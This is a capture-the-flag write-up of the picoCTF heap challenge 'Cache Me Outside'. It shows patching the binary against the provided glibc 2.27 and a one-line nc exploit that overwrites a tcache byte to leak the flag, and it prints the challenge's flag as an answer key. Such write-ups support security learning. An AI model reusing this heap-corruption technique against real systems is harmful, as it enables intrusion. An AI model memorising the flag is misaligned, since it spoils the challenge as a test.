# Cache Me Outside
## Description
While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. `nc mercury.picoctf.net 10097` heapedit Makefile libc.so.6
> 70 points

## Hint
It may be helpful to read a little bit on GLIBC's tcache.


```console
┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$ ./heapedit 
zsh: segmentation fault  ./heapedit

```
provided the `libc.so.6`
```console
┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$ ls
heapedit  libc.so.6  Makefile
                                                                                                                                            
┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$ ./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

```console
┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$ strings libc.so.6 | grep version 
versionsort64
versionsort
argp_program_version_hook
gnu_get_libc_version
argp_program_version
RPC: Incompatible versions of RPC
RPC: Program/version mismatch
<malloc version="1">
Print program version
(PROGRAM ERROR) No version known!?
%s: %s; low version = %lu, high version = %lu
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
Compiled by GNU CC version 7.5.0.
.gnu.version
.gnu.version_d
.gnu.version_r

┌──(kali㉿kali)-[~/.tools/patchelf]
└─$ sudo apt-get install autoconf
[sudo] password for kali: 
...

```

install `pathelf` [here](https://github.com/NixOS/patchelf)

    ./bootstrap.sh
    ./configure
    make
    make check
    sudo make install
    
run `pwninit`
```console
┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$ ~/.tools/pwninit
bin: ./heapedit_patched
libc: ./libc.so.6
ld: ./ld-2.27.so

unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb                                                 
warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2)              
copying ./heapedit_patched to ./heapedit_patched_patched
running patchelf on ./heapedit_patched_patched
writing solve.py stub
....

┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$ ls
heapedit          ld-2.27.so  Makefile
heapedit_patched  libc.so.6   solve.py

┌──(kali㉿kali)-[~/workspace/picoctf/cache]
└─$  { echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 10097 
You may edit one byte in the program.
Address: Value: lag is: picoCTF{97c85bbf2168f674263a1c5629b411a3}

```

> picoCTF{97c85bbf2168f674263a1c5629b411a3}

